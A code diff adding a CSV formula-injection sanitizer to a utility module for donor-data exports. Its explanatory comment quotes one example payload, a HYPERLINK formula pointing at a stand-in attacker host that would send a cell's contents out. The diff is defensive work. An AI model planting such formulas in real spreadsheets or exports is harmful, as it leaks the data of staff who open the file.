@@ -16,6 +16,17 @@ export function escapeHtml(value: unknown): string {
     .replace(/'/g, '&#39;')
 }
 
+// Neutralizes CSV formula injection (CWE-1236): if a cell's text starts with
+// =, +, -, or @, Excel/Sheets treats it as a live formula when the file is
+// opened, regardless of surrounding quotes — a malicious donor name like
+// `=HYPERLINK("http://evil.com/"&A2,"Click")` executes for the staff member
+// who opens the export. Prefixing with a single quote forces plain-text
+// display in every spreadsheet app without changing what's visibly shown.
+export function sanitizeCsvCell(value: unknown): string {
+  const s = String(value ?? '')
+  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s
+}
+
 // Named presets for the ~10 distinct `.toLocaleDateString('en-SG', {...})` option
 // combinations found in App.jsx. `'numeric'` matches the bare `toLocaleDateString('en-SG')`
 // call with no options (locale-default numeric date, e.g. "1/6/2025").
